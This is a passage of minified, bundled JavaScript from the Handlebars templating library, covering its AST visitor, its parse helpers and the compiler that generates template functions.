                for (var t = 0, n = e.length; t < n; t++) this.acceptKey(e, t), e[t] || (e.splice(t, 1), t--, n--)
            },
            accept: function (e) {
                if (e) {
                    if (!this[e.type]) throw new r.default("Unknown type: " + e.type, e);
                    this.current && this.parents.unshift(this.current), this.current = e;
                    var t = this[e.type](e);
                    return this.current = this.parents.shift(), !this.mutating || t ? t : !1 !== t ? e : void 0
                }
            },
            Program: function (e) {
                this.acceptArray(e.body)
            },
            MustacheStatement: s,
            Decorator: s,
            BlockStatement: o,
            DecoratorBlock: o,
            PartialStatement: l,
            PartialBlockStatement: function (e) {
                l.call(this, e), this.acceptKey(e, "program")
            },
            ContentStatement: function () {
            },
            CommentStatement: function () {
            },
            SubExpression: s,
            PathExpression: function () {
            },
            StringLiteral: function () {
            },
            NumberLiteral: function () {
            },
            BooleanLiteral: function () {
            },
            UndefinedLiteral: function () {
            },
            NullLiteral: function () {
            },
            Hash: function (e) {
                this.acceptArray(e.pairs)
            },
            HashPair: function (e) {
                this.acceptRequired(e, "value")
            }
        }, t.default = a, e.exports = t.default
    }, function (e, t, n) {
        "use strict";
        var i = n(1).default;
        t.__esModule = !0, t.SourceLocation = function (e, t) {
            this.source = e, this.start = {line: t.first_line, column: t.first_column}, this.end = {
                line: t.last_line,
                column: t.last_column
            }
        }, t.id = function (e) {
            return /^\[.*\]$/.test(e) ? e.substr(1, e.length - 2) : e
        }, t.stripFlags = function (e, t) {
            return {open: "~" === e.charAt(2), close: "~" === t.charAt(t.length - 3)}
        }, t.stripComment = function (e) {
            return e.replace(/^\{\{~?!-?-?/, "").replace(/-?-?~?\}\}$/, "")
        }, t.preparePath = function (e, t, n) {
            n = this.locInfo(n);
            for (var i = e ? "@" : "", a = [], s = 0, o = 0, l = t.length; o < l; o++) {
                var c = t[o].part, u = t[o].original !== c;
                if (i += (t[o].separator || "") + c, u || ".." !== c && "." !== c && "this" !== c) a.push(c); else {
                    if (0 < a.length) throw new r.default("Invalid path: " + i, {loc: n});
                    ".." === c && s++
                }
            }
            return {type: "PathExpression", data: e, depth: s, parts: a, original: i, loc: n}
        }, t.prepareMustache = function (e, t, n, i, r, a) {
            var s = "{" !== (s = i.charAt(3) || i.charAt(2)) && "&" !== s;
            return {
                type: /\*/.test(i) ? "Decorator" : "MustacheStatement",
                path: e,
                params: t,
                hash: n,
                escaped: s,
                strip: r,
                loc: this.locInfo(a)
            }
        }, t.prepareRawBlock = function (e, t, n, i) {
            return a(e, n), t = {
                type: "Program",
                body: t,
                strip: {},
                loc: i = this.locInfo(i)
            }, {
                type: "BlockStatement",
                path: e.path,
                params: e.params,
                hash: e.hash,
                program: t,
                openStrip: {},
                inverseStrip: {},
                closeStrip: {},
                loc: i
            }
        }, t.prepareBlock = function (e, t, n, i, s, o) {
            i && i.path && a(e, i);
            var l = /\*/.test(e.open);
            t.blockParams = e.blockParams;
            var c = void 0, u = void 0;
            if (n) {
                if (l) throw new r.default("Unexpected inverse block on decorator", n);
                n.chain && (n.program.body[0].closeStrip = i.strip), u = n.strip, c = n.program
            }
            return s && (s = c, c = t, t = s), {
                type: l ? "DecoratorBlock" : "BlockStatement",
                path: e.path,
                params: e.params,
                hash: e.hash,
                program: t,
                inverse: c,
                openStrip: e.strip,
                inverseStrip: u,
                closeStrip: i && i.strip,
                loc: this.locInfo(o)
            }
        }, t.prepareProgram = function (e, t) {
            var n, i;
            return !t && e.length && (n = e[0].loc, i = e[e.length - 1].loc, n && i && (t = {
                source: n.source,
                start: {line: n.start.line, column: n.start.column},
                end: {line: i.end.line, column: i.end.column}
            })), {type: "Program", body: e, strip: {}, loc: t}
        }, t.preparePartialBlock = function (e, t, n, i) {
            return a(e, n), {
                type: "PartialBlockStatement",
                name: e.path,
                params: e.params,
                hash: e.hash,
                program: t,
                openStrip: e.strip,
                closeStrip: n && n.strip,
                loc: this.locInfo(i)
            }
        };
        var r = i(n(6));

        function a(e, t) {
            if (t = t.path ? t.path.original : t, e.path.original !== t) {
                var n = {loc: e.path.loc};
                throw new r.default(e.path.original + " doesn't match " + t, n)
            }
        }
    }, function (e, t, n) {
        "use strict";
        var i = n(1).default;
        t.__esModule = !0, t.Compiler = l, t.precompile = function (e, t, n) {
            if (null == e || "string" != typeof e && "Program" !== e.type) throw new r.default("You must pass a string or Handlebars AST to Handlebars.precompile. You passed " + e);
            return "data" in (t = t || {}) || (t.data = !0), t.compat && (t.useDepths = !0), e = n.parse(e, t), e = (new n.Compiler).compile(e, t), (new n.JavaScriptCompiler).compile(e, t)
        }, t.compile = function (e, t, n) {
            if (void 0 === t && (t = {}), null == e || "string" != typeof e && "Program" !== e.type) throw new r.default("You must pass a string or Handlebars AST to Handlebars.compile. You passed " + e);
            "data" in (t = a.extend({}, t)) || (t.data = !0), t.compat && (t.useDepths = !0);
            var i = void 0;

            function s() {
                var i = n.parse(e, t);
                i = (new n.Compiler).compile(i, t), i = (new n.JavaScriptCompiler).compile(i, t, void 0, !0);
                return n.template(i)
            }

            function o(e, t) {
                return (i = i || s()).call(this, e, t)
            }

            return o._setup = function (e) {
                return (i = i || s())._setup(e)
            }, o._child = function (e, t, n, r) {
                return (i = i || s())._child(e, t, n, r)
            }, o
        };
        var r = i(n(6)), a = n(5), s = i(n(35)), o = [].slice;

        function l() {
        }

        function c(e) {
            var t;
            e.path.parts || (t = e.path, e.path = {
                type: "PathExpression",
                data: !1,
                depth: 0,
                parts: [t.original + ""],
                original: t.original + "",
                loc: t.loc
            })
        }

        l.prototype = {
            compiler: l, equals: function (e) {
                var t = this.opcodes.length;
                if (e.opcodes.length !== t) return !1;
                for (var n = 0; n < t; n++) {
                    var i = this.opcodes[n], r = e.opcodes[n];
                    if (i.opcode !== r.opcode || !function e(t, n) {
                        if (t === n) return !0;
                        if (a.isArray(t) && a.isArray(n) && t.length === n.length) {
                            for (var i = 0; i < t.length; i++) if (!e(t[i], n[i])) return !1;
                            return !0
                        }
                    }(i.args, r.args)) return !1
                }
                for (t = this.children.length, n = 0; n < t; n++) if (!this.children[n].equals(e.children[n])) return !1;
                return !0
            }, guid: 0, compile: function (e, t) {
                this.sourceNode = [], this.opcodes = [], this.children = [], this.options = t, this.stringParams = t.stringParams, this.trackIds = t.trackIds, t.blockParams = t.blockParams || [];
                var n = t.knownHelpers;
                if (t.knownHelpers = {
                    helperMissing: !0,
                    blockHelperMissing: !0,
                    each: !0,
                    if: !0,
                    unless: !0,
                    with: !0,
                    log: !0,
                    lookup: !0
                }, n) for (var i in n) this.options.knownHelpers[i] = n[i];
                return this.accept(e)
            }, compileProgram: function (e) {
                var t = (new this.compiler).compile(e, this.options);
                e = this.guid++;
                return this.usePartial = this.usePartial || t.usePartial, this.children[e] = t, this.useDepths = this.useDepths || t.useDepths, e
            }, accept: function (e) {
                if (!this[e.type]) throw new r.default("Unknown type: " + e.type, e);
                return this.sourceNode.unshift(e), e = this[e.type](e), this.sourceNode.shift(), e
            }, Program: function (e) {
                this.options.blockParams.unshift(e.blockParams);
                for (var t = e.body, n = t.length, i = 0; i < n; i++) this.accept(t[i]);
                return this.options.blockParams.shift(), this.isSimple = 1 === n, this.blockParams = e.blockParams ? e.blockParams.length : 0, this
            }, BlockStatement: function (e) {
                c(e);
                var t = e.program, n = e.inverse,
                    i = (t = t && this.compileProgram(t), n = n && this.compileProgram(n), this.classifySexpr(e));
                "helper" === i ? this.helperSexpr(e, t, n) : "simple" === i ? (this.simpleSexpr(e), this.opcode("pushProgram", t), this.opcode("pushProgram", n), this.opcode("emptyHash"), this.opcode("blockValue", e.path.original)) : (this.ambiguousSexpr(e, t, n), this.opcode("pushProgram", t), this.opcode("pushProgram", n), this.opcode("emptyHash"), this.opcode("ambiguousBlockValue")), this.opcode("append")
            }, DecoratorBlock: function (e) {
                var t = e.program && this.compileProgram(e.program);
                t = this.setupFullMustacheParams(e, t, void 0), e = e.path;
                this.useDecorators = !0, this.opcode("registerDecorator", t.length, e.original)
            }, PartialStatement: function (e) {
                this.usePartial = !0;
                var t = (t = e.program) && this.compileProgram(e.program);
                if (1 < (n = e.params).length) throw new r.default("Unsupported number of partial arguments: " + n.length, e);
                n.length || (this.options.explicitPartialContext ? this.opcode("pushLiteral", "undefined") : n.push({
                    type: "PathExpression",
                    parts: [],
                    depth: 0
                }));
                var n, i = e.name.original;
                (n = "SubExpression" === e.name.type) && this.accept(e.name), this.setupFullMustacheParams(e, t, void 0, !0), e = e.indent || "", this.options.preventIndent && e && (this.opcode("appendContent", e), e = ""), this.opcode("invokePartial", n, i, e), this.opcode("append")
            }, PartialBlockStatement: function (e) {
                this.PartialStatement(e)
            }, MustacheStatement: function (e) {
                this.SubExpression(e), e.escaped && !this.options.noEscape ? this.opcode("appendEscaped") : this.opcode("append")
            }, Decorator: function (e) {
                this.DecoratorBlock(e)
            }, ContentStatement: function (e) {
                e.value && this.opcode("appendContent", e.value)
            }, CommentStatement: function () {
            }, SubExpression: function (e) {
                c(e);
                var t = this.classifySexpr(e);
                "simple" === t ? this.simpleSexpr(e) : "helper" === t ? this.helperSexpr(e) : this.ambiguousSexpr(e)
            }, ambiguousSexpr: function (e, t, n) {
                var i = e.path, r = i.parts[0];
                e = null != t || null != n;
                this.opcode("getContext", i.depth), this.opcode("pushProgram", t), this.opcode("pushProgram", n), i.strict = !0, this.accept(i), this.opcode("invokeAmbiguous", r, e)
            }, simpleSexpr: function (e) {
                (e = e.path).strict = !0, this.accept(e), this.opcode("resolvePossibleLambda")
            }, helperSexpr: function (e, t, n) {
                var i = this.setupFullMustacheParams(e, t, n);
                n = (t = e.path).parts[0];
                if (this.options.knownHelpers[n]) this.opcode("invokeKnownHelper", i.length, n); else {
                    if (this.options.knownHelpersOnly) throw new r.default("You specified knownHelpersOnly, but used the unknown helper " + n, e);
                    t.strict = !0, t.falsy = !0, this.accept(t), this.opcode("invokeHelper", i.length, t.original, s.default.helpers.simpleId(t))
                }
            }, PathExpression: function (e) {
                this.addDepth(e.depth), this.opcode("getContext", e.depth);
                var t = e.parts[0], n = s.default.helpers.scopedId(e), i = !e.depth && !n && this.blockParamIndex(t);
                i ? this.opcode("lookupBlockParam", i, e.parts) : t ? e.data ? (this.options.data = !0, this.opcode("lookupData", e.depth, e.parts, e.strict)) : this.opcode("lookupOnContext", e.parts, e.falsy, e.strict, n) : this.opcode("pushContext")
            }, StringLiteral: function (e) {
                this.opcode("pushString", e.value)
            }, NumberLiteral: function (e) {
                this.opcode("pushLiteral", e.value)
            }, BooleanLiteral: function (e) {
                this.opcode("pushLiteral", e.value)
            }, UndefinedLiteral: function () {
                this.opcode("pushLiteral", "undefined")
            }, NullLiteral: function () {
                this.opcode("pushLiteral", "null")
            }, Hash: function (e) {
                var t = e.pairs, n = 0, i = t.length;
                for (this.opcode("pushHash"); n < i; n++) this.pushParam(t[n].value);
                for (; n--;) this.opcode("assignToHash", t[n].key);
                this.opcode("popHash")
            }, opcode: function (e) {
                this.opcodes.push({opcode: e, args: o.call(arguments, 1), loc: this.sourceNode[0].loc})
            }, addDepth: function (e) {
                e && (this.useDepths = !0)
            }, classifySexpr: function (e) {
                var t, n = s.default.helpers.simpleId(e.path),
                    i = !(t = n && !!this.blockParamIndex(e.path.parts[0])) && s.default.helpers.helperExpression(e);
                return (t = !t && (i || n)) && !i && (n = e.path.parts[0], (e = this.options).knownHelpers[n] ? i = !0 : e.knownHelpersOnly && (t = !1)), i ? "helper" : t ? "ambiguous" : "simple"
            }, pushParams: function (e) {
                for (var t = 0, n = e.length; t < n; t++) this.pushParam(e[t])
            }, pushParam: function (e) {
                var t, n, i = null != e.value ? e.value : e.original || "";
                this.stringParams ? (i.replace && (i = i.replace(/^(\.?\.\/)*/g, "").replace(/\//g, ".")), e.depth && this.addDepth(e.depth), this.opcode("getContext", e.depth || 0), this.opcode("pushStringParam", i, e.type), "SubExpression" === e.type && this.accept(e)) : (this.trackIds && (t = void 0, (t = !e.parts || s.default.helpers.scopedId(e) || e.depth ? t : this.blockParamIndex(e.parts[0])) ? (n = e.parts.slice(1).join("."), this.opcode("pushId", "BlockParam", t, n)) : ((i = e.original || i).replace && (i = i.replace(/^this(?:\.|$)/, "").replace(/^\.\//, "").replace(/^\.$/, "")), this.opcode("pushId", e.type, i))), this.accept(e))
            }, setupFullMustacheParams: function (e, t, n, i) {
                var r = e.params;
                return this.pushParams(r), this.opcode("pushProgram", t), this.opcode("pushProgram", n), e.hash ? this.accept(e.hash) : this.opcode("emptyHash", i), r
            }, blockParamIndex: function (e) {
                for (var t = 0, n = this.options.blockParams.length; t < n; t++) {
                    var i = this.options.blockParams[t], r = i && a.indexOf(i, e);
                    if (i && 0 <= r) return [t, r]
                }
            }
        }
    }, function (e, t, n) {
        "use strict";
        var i = n(1).default;
        t.__esModule = !0;
        var r = n(4), a = i(n(6)), s = n(5), o = i(n(43));

        function l(e) {
            this.value = e
        }

        function c() {
        }

        c.prototype = {
            nameLookup: function (e, t) {
                return "constructor" === t ? ["(", e, ".propertyIsEnumerable('constructor') ? ", e, ".constructor : undefined", ")"] : c.isValidJavaScriptVariableName(t) ? [e, ".", t] : [e, "[", JSON.stringify(t), "]"]
            }, depthedLookup: function (e) {
                return [this.aliasable("container.lookup"), '(depths, "', e, '")']
            }, compilerInfo: function () {
                var e = r.COMPILER_REVISION;
                return [e, r.REVISION_CHANGES[e]]
            }, appendToBuffer: function (e, t, n) {
                return s.isArray(e) || (e = [e]), e = this.source.wrap(e, t), this.environment.isSimple ? ["return ", e, ";"] : n ? ["buffer += ", e, ";"] : (e.appendToBuffer = !0, e)
            }, initializeBuffer: function () {
                return this.quotedString("")
            }, compile: function (e, t, n, i) {
                this.environment = e, this.options = t, this.stringParams = this.options.stringParams, this.trackIds = this.options.trackIds, this.precompile = !i, this.name = this.environment.name, this.isChild = !!n, this.context = n || {
                    decorators: [],
                    programs: [],
                    environments: []
                }, this.preamble(), this.stackSlot = 0, this.stackVars = [], this.aliases = {}, this.registers = {list: []}, this.hashes = [], this.compileStack = [], this.inlineStack = [], this.blockParams = [], this.compileChildren(e, t), this.useDepths = this.useDepths || e.useDepths || e.useDecorators || this.options.compat, this.useBlockParams = this.useBlockParams || e.useBlockParams;
                var r, s = e.opcodes, o = void 0, l = void 0, c = void 0;
                for (l = 0, c = s.length; l < c; l++) r = s[l], this.source.currentLocation = r.loc, o = o || r.loc, this[r.opcode].apply(this, r.args);
                if (this.source.currentLocation = o, this.pushSource(""), this.stackSlot || this.inlineStack.length || this.compileStack.length) throw new a.default("Compile completed with content left on stack");
                if (this.decorators.isEmpty() ? this.decorators = void 0 : (this.useDecorators = !0, this.decorators.prepend("var decorators = container.decorators;\n"), this.decorators.push("return fn;"), i ? this.decorators = Function.apply(this, ["fn", "props", "container", "depth0", "data", "blockParams", "depths", this.decorators.merge()]) : (this.decorators.prepend("function(fn, props, container, depth0, data, blockParams, depths) {\n"), this.decorators.push("}\n"), this.decorators = this.decorators.merge())), e = this.createFunctionContext(i), this.isChild) return e;
                var u = {compiler: this.compilerInfo(), main: e};
                this.decorators && (u.main_d = this.decorators, u.useDecorators = !0);
                var d = (e = this.context).programs, p = e.decorators;
                for (l = 0, c = d.length; l < c; l++) d[l] && (u[l] = d[l], p[l] && (u[l + "_d"] = p[l], u.useDecorators = !0));
                return this.environment.usePartial && (u.usePartial = !0), this.options.data && (u.useData = !0), this.useDepths && (u.useDepths = !0), this.useBlockParams && (u.useBlockParams = !0), this.options.compat && (u.compat = !0), i ? u.compilerOptions = this.options : (u.compiler = JSON.stringify(u.compiler), this.source.currentLocation = {
                    start: {
                        line: 1,
                        column: 0
                    }
                }, u = this.objectLiteral(u), t.srcName ? (u = u.toStringWithSourceMap({file: t.destName})).map = u.map && u.map.toString() : u = u.toString()), u
            }, preamble: function () {
                this.lastContext = 0, this.source = new o.default(this.options.srcName), this.decorators = new o.default(this.options.srcName)
            }, createFunctionContext: function (e) {
                var t = "", n = this.stackVars.concat(this.registers.list);
                0 < n.length && (t += ", " + n.join(", "));
                var i, r = 0;
                for (i in this.aliases) {
                    var a = this.aliases[i];
                    this.aliases.hasOwnProperty(i) && a.children && 1 < a.referenceCount && (t += ", alias" + ++r + "=" + i, a.children[0] = "alias" + r)
                }
                var s = ["container", "depth0", "helpers", "partials", "data"];
                return (this.useBlockParams || this.useDepths) && s.push("blockParams"), this.useDepths && s.push("depths"), n = this.mergeSource(t), e ? (s.push(n), Function.apply(this, s)) : this.source.wrap(["function(", s.join(","), ") {\n  ", n, "}"])
            }, mergeSource: function (e) {
                var t = this.environment.isSimple, n = !this.forceBuffer, i = void 0, r = void 0, a = void 0,
                    s = void 0;
                return this.source.each((function (e) {
                    e.appendToBuffer ? (a ? e.prepend("  + ") : a = e, s = e) : (a && (r ? a.prepend("buffer += ") : i = !0, s.add(";"), a = s = void 0), r = !0, t || (n = !1))
                })), n ? a ? (a.prepend("return "), s.add(";")) : r || this.source.push('return "";') : (e += ", buffer = " + (i ? "" : this.initializeBuffer()), a ? (a.prepend("return buffer + "), s.add(";")) : this.source.push("return buffer;")), e && this.source.prepend("var " + e.substring(2) + (i ? "" : ";\n")), this.source.merge()
            }, blockValue: function (e) {
                var t = this.aliasable("helpers.blockHelperMissing"), n = [this.contextName(0)];
                this.setupHelperArgs(e, 0, n), e = this.popStack(), n.splice(1, 0, e), this.push(this.source.functionCall(t, "call", n))
            }, ambiguousBlockValue: function () {
                var e = this.aliasable("helpers.blockHelperMissing"), t = [this.contextName(0)];
                this.setupHelperArgs("", 0, t, !0), this.flushInline();
                var n = this.topStack();
                t.splice(1, 0, n), this.pushSource(["if (!", this.lastHelper, ") { ", n, " = ", this.source.functionCall(e, "call", t), "}"])
            }, appendContent: function (e) {
                this.pendingContent ? e = this.pendingContent + e : this.pendingLocation = this.source.currentLocation, this.pendingContent = e
            }, append: function () {
                var e;
                this.isInline() ? (this.replaceStack((function (e) {
                    return [" != null ? ", e, ' : ""']
                })), this.pushSource(this.appendToBuffer(this.popStack()))) : (e = this.popStack(), this.pushSource(["if (", e, " != null) { ", this.appendToBuffer(e, void 0, !0), " }"]), this.environment.isSimple && this.pushSource(["else { ", this.appendToBuffer("''", void 0, !0), " }"]))
            }, appendEscaped: function () {
                this.pushSource(this.appendToBuffer([this.aliasable("container.escapeExpression"), "(", this.popStack(), ")"]))
            }, getContext: function (e) {
                this.lastContext = e
            }, pushContext: function () {
                this.pushStackLiteral(this.contextName(this.lastContext))
            }, lookupOnContext: function (e, t, n, i) {
                var r = 0;
                i || !this.options.compat || this.lastContext ? this.pushContext() : this.push(this.depthedLookup(e[r++])), this.resolvePath("context", e, r, t, n)
            }, lookupBlockParam: function (e, t) {
                this.useBlockParams = !0, this.push(["blockParams[", e[0], "][", e[1], "]"]), this.resolvePath("context", t, 1)
            }, lookupData: function (e, t, n) {
                e ? this.pushStackLiteral("container.data(data, " + e + ")") : this.pushStackLiteral("data"), this.resolvePath("data", t, 0, !0, n)
            }, resolvePath: function (e, t, n, i, r) {
                var a = this;
                if (this.options.strict || this.options.assumeObjects) this.push(function (e, t, n, i) {
                    var r = t.popStack(), a = 0, s = n.length;
                    for (e && s--; a < s; a++) r = t.nameLookup(r, n[a], i);
                    return e ? [t.aliasable("container.strict"), "(", r, ", ", t.quotedString(n[a]), ")"] : r
                }(this.options.strict && r, this, t, e)); else for (var s = t.length; n < s; n++) this.replaceStack((function (r) {
                    var s = a.nameLookup(r, t[n], e);
                    return i ? [" && ", s] : [" != null ? ", s, " : ", r]
                }))
            }, resolvePossibleLambda: function () {
                this.push([this.aliasable("container.lambda"), "(", this.popStack(), ", ", this.contextName(0), ")"])
            }, pushStringParam: function (e, t) {
                this.pushContext(), this.pushString(t), "SubExpression" !== t && ("string" == typeof e ? this.pushString(e) : this.pushStackLiteral(e))
            }, emptyHash: function (e) {
                this.trackIds && this.push("{}"), this.stringParams && (this.push("{}"), this.push("{}")), this.pushStackLiteral(e ? "undefined" : "{}")
            }, pushHash: function () {
                this.hash && this.hashes.push(this.hash), this.hash = {values: [], types: [], contexts: [], ids: []}
            }, popHash: function () {
                var e = this.hash;
                this.hash = this.hashes.pop(), this.trackIds && this.push(this.objectLiteral(e.ids)), this.stringParams && (this.push(this.objectLiteral(e.contexts)), this.push(this.objectLiteral(e.types))), this.push(this.objectLiteral(e.values))
            }, pushString: function (e) {
                this.pushStackLiteral(this.quotedString(e))
            }, pushLiteral: function (e) {
                this.pushStackLiteral(e)
            }, pushProgram: function (e) {
                null != e ? this.pushStackLiteral(this.programExpression(e)) : this.pushStackLiteral(null)
            }, registerDecorator: function (e, t) {
                var n = this.nameLookup("decorators", t, "decorator");
                e = this.setupHelperArgs(t, e);
                this.decorators.push(["fn = ", this.decorators.functionCall(n, "", ["fn", "props", "container", e]), " || fn;"])
            }, invokeHelper: function (e, t, n) {
                var i = this.popStack();
                t = this.setupHelper(e, t), n = n ? [t.name, " || "] : "", i = ["("].concat(n, i);
                this.options.strict || i.push(" || ", this.aliasable("helpers.helperMissing")), i.push(")"), this.push(this.source.functionCall(i, "call", t.callParams))
            }, invokeKnownHelper: function (e, t) {
                t = this.setupHelper(e, t), this.push(this.source.functionCall(t.name, "call", t.callParams))
            }, invokeAmbiguous: function (e, t) {
                this.useRegister("helper");
                var n = this.popStack();
                this.emptyHash(), t = this.setupHelper(0, e, t), n = ["(", "(helper = ", this.lastHelper = this.nameLookup("helpers", e, "helper"), " || ", n, ")"], this.options.strict || (n[0] = "(helper = ", n.push(" != null ? helper : ", this.aliasable("helpers.helperMissing"))), this.push(["(", n, t.paramsInit ? ["),(", t.paramsInit] : [], "),", "(typeof helper === ", this.aliasable('"function"'), " ? ", this.source.functionCall("helper", "call", t.callParams), " : helper))"])
            }, invokePartial: function (e, t, n) {
                var i = [], r = this.setupParams(t, 1, i);
                e && (t = this.popStack(), delete r.name), n && (r.indent = JSON.stringify(n)), r.helpers = "helpers", r.partials = "partials", r.decorators = "container.decorators", e ? i.unshift(t) : i.unshift(this.nameLookup("partials", t, "partial")), this.options.compat && (r.depths = "depths"), r = this.objectLiteral(r), i.push(r), this.push(this.source.functionCall("container.invokePartial", "", i))
            }, assignToHash: function (e) {
                var t = this.popStack(), n = void 0, i = void 0, r = void 0;
                this.trackIds && (r = this.popStack()), this.stringParams && (i = this.popStack(), n = this.popStack());
                var a = this.hash;
                n && (a.contexts[e] = n), i && (a.types[e] = i), r && (a.ids[e] = r), a.values[e] = t
            }, pushId: function (e, t, n) {
                "BlockParam" === e ? this.pushStackLiteral("blockParams[" + t[0] + "].path[" + t[1] + "]" + (n ? " + " + JSON.stringify("." + n) : "")) : "PathExpression" === e ? this.pushString(t) : "SubExpression" === e ? this.pushStackLiteral("true") : this.pushStackLiteral("null")
            }, compiler: c, compileChildren: function (e, t) {
                for (var n = e.children, i = void 0, r = void 0, a = 0, s = n.length; a < s; a++) {
                    i = n[a], r = new this.compiler;
                    var o, l = this.matchExistingProgram(i);
                    null == l ? (this.context.programs.push(""), o = this.context.programs.length, i.index = o, i.name = "program" + o, this.context.programs[o] = r.compile(i, t, this.context, !this.precompile), this.context.decorators[o] = r.decorators, this.context.environments[o] = i, this.useDepths = this.useDepths || r.useDepths, this.useBlockParams = this.useBlockParams || r.useBlockParams, i.useDepths = this.useDepths, i.useBlockParams = this.useBlockParams) : (i.index = l.index, i.name = "program" + l.index, this.useDepths = this.useDepths || l.useDepths, this.useBlockParams = this.useBlockParams || l.useBlockParams)
                }
            }, matchExistingProgram: function (e) {
                for (var t = 0, n = this.context.environments.length; t < n; t++) {
                    var i = this.context.environments[t];
                    if (i && i.equals(e)) return i
                }
            }, programExpression: function (e) {
                return e = [(e = this.environment.children[e]).index, "data", e.blockParams], (this.useBlockParams || this.useDepths) && e.push("blockParams"), this.useDepths && e.push("depths"), "container.program(" + e.join(", ") + ")"
            }, useRegister: function (e) {
                this.registers[e] || (this.registers[e] = !0, this.registers.list.push(e))
            }, push: function (e) {
                return e instanceof l || (e = this.source.wrap(e)), this.inlineStack.push(e), e
            }, pushStackLiteral: function (e) {
                this.push(new l(e))
            }, pushSource: function (e) {
                this.pendingContent && (this.source.push(this.appendToBuffer(this.source.quotedString(this.pendingContent), this.pendingLocation)), this.pendingContent = void 0), e && this.source.push(e)
            }, replaceStack: function (e) {
                var t = ["("], n = void 0, i = void 0, r = void 0;
                if (!this.isInline()) throw new a.default("replaceStack on non-inline");
                var s, o = this.popStack(!0);
                o instanceof l ? (t = ["(", n = [o.value]], r = !0) : (i = !0, s = this.incrStack(), t = ["((", this.push(s), " = ", o, ")"], n = this.topStack()), n = e.call(this, n), r || this.popStack(), i && this.stackSlot--, this.push(t.concat(n, ")"))
            }, incrStack: function () {
                return this.stackSlot++, this.stackSlot > this.stackVars.length && this.stackVars.push("stack" + this.stackSlot), this.topStackName()
            }, topStackName: function () {
                return "stack" + this.stackSlot
            }, flushInline: function () {
                var e = this.inlineStack;
                this.inlineStack = [];
                for (var t = 0, n = e.length; t < n; t++) {
                    var i, r = e[t];
                    r instanceof l ? this.compileStack.push(r) : (i = this.incrStack(), this.pushSource([i, " = ", r, ";"]), this.compileStack.push(i))
                }
            }, isInline: function () {
                return this.inlineStack.length
            }, popStack: function (e) {
                var t = this.isInline(), n = (t ? this.inlineStack : this.compileStack).pop();
                if (!e && n instanceof l) return n.value;
                if (!t) {
                    if (!this.stackSlot) throw new a.default("Invalid stack pop");
                    this.stackSlot--
                }
                return n
            }, topStack: function () {
                var e;
                return (e = (e = this.isInline() ? this.inlineStack : this.compileStack)[e.length - 1]) instanceof l ? e.value : e
            }, contextName: function (e) {
                return this.useDepths && e ? "depths[" + e + "]" : "depth" + e
            }, quotedString: function (e) {
                return this.source.quotedString(e)
            }, objectLiteral: function (e) {
                return this.source.objectLiteral(e)
            }, aliasable: function (e) {
                var t = this.aliases[e];
                return t ? t.referenceCount++ : ((t = this.aliases[e] = this.source.wrap(e)).aliasable = !0, t.referenceCount = 1), t
            }, setupHelper: function (e, t, n) {
                var i = [];
                return {
                    params: i,
                    paramsInit: this.setupHelperArgs(t, e, i, n),
                    name: this.nameLookup("helpers", t, "helper"),
                    callParams: [this.aliasable(this.contextName(0) + " != null ? " + this.contextName(0) + " : (container.nullContext || {})")].concat(i)
                }
            }, setupParams: function (e, t, n) {
                var i, r = {}, a = [], s = [], o = [], l = !n;
                l && (n = []), r.name = this.quotedString(e), r.hash = this.popStack(), this.trackIds && (r.hashIds = this.popStack()), this.stringParams && (r.hashTypes = this.popStack(), r.hashContexts = this.popStack());
                var c = this.popStack();
                ((e = this.popStack()) || c) && (r.fn = e || "container.noop", r.inverse = c || "container.noop");
                for (var u = t; u--;) i = this.popStack(), n[u] = i, this.trackIds && (o[u] = this.popStack()), this.stringParams && (s[u] = this.popStack(), a[u] = this.popStack());
                return l && (r.args = this.source.generateArray(n)), this.trackIds && (r.ids = this.source.generateArray(o)), this.stringParams && (r.types = this.source.generateArray(s), r.contexts = this.source.generateArray(a)), this.options.data && (r.data = "data"), this.useBlockParams && (r.blockParams = "blockParams"), r
            }, setupHelperArgs: function (e, t, n, i) {
                return t = this.setupParams(e, t, n), t = this.objectLiteral(t), i ? (this.useRegister("options"), n.push("options"), ["options=", t]) : n ? (n.push(t), "") : t
            }
        }, function () {
            for (var e = "break else new var case finally return void catch for switch while continue function this with default if throw delete in try do instanceof typeof abstract enum int short boolean export interface static byte extends long super char final native synchronized class float package throws const goto private transient debugger implements protected volatile double import public let yield await null true false".split(" "), t = c.RESERVED_WORDS = {}, n = 0, i = e.length; n < i; n++) t[e[n]] = !0
        }(), c.isValidJavaScriptVariableName = function (e) {
            return !c.RESERVED_WORDS[e] && /^[a-zA-Z_$][0-9a-zA-Z_$]*$/.test(e)
        }, t.default = c, e.exports = t.default
    }, function (e, t, n) {
        "use strict";
        t.__esModule = !0;
        var i = n(5), r = void 0;

        function a(e, t, n) {
            if (i.isArray(e)) {
                for (var r = [], a = 0, s = e.length; a < s; a++) r.push(t.wrap(e[a], n));
                return r
            }
            return "boolean" == typeof e || "number" == typeof e ? e + "" : e
        }

        function s(e) {
            this.srcFile = e, this.source = []
        }

        r || ((r = function (e, t, n, i) {
            this.src = "", i && this.add(i)
        }).prototype = {
            add: function (e) {
                i.isArray(e) && (e = e.join("")), this.src += e
            }, prepend: function (e) {
                i.isArray(e) && (e = e.join("")), this.src = e + this.src
            }, toStringWithSourceMap: function () {
                return {code: this.toString()}
            }, toString: function () {
                return this.src
            }
        }), s.prototype = {
            isEmpty: function () {
                return !this.source.length
            }, prepend: function (e, t) {
                this.source.unshift(this.wrap(e, t))
            }, push: function (e, t) {
                this.source.push(this.wrap(e, t))
            }, merge: function () {
                var e = this.empty();
                return this.each((function (t) {
                    e.add(["  ", t, "\n"])
                })), e
            }, each: function (e) {
                for (var t = 0, n = this.source.length; t < n; t++) e(this.source[t])
            }, empty: function () {
                var e = this.currentLocation || {start: {}};
                return new r(e.start.line, e.start.column, this.srcFile)
            }, wrap: function (e) {
                var t = arguments.length <= 1 || void 0 === arguments[1] ? this.currentLocation || {start: {}} : arguments[1];
                return e instanceof r ? e : (e = a(e, this, t), new r(t.start.line, t.start.column, this.srcFile, e))
            }, functionCall: function (e, t, n) {
                return n = this.generateList(n), this.wrap([e, t ? "." + t + "(" : "(", n, ")"])
            }, quotedString: function (e) {
                return '"' + (e + "").replace(/\\/g, "\\\\").replace(/"/g, '\\"').replace(/\n/g, "\\n").replace(/\r/g, "\\r").replace(/\u2028/g, "\\u2028").replace(/\u2029/g, "\\u2029") + '"'
            }, objectLiteral: function (e) {
                var t, n, i = [];
                for (t in e) !e.hasOwnProperty(t) || "undefined" !== (n = a(e[t], this)) && i.push([this.quotedString(t), ":", n]);
                var r = this.generateList(i);
                return r.prepend("{"), r.add("}"), r
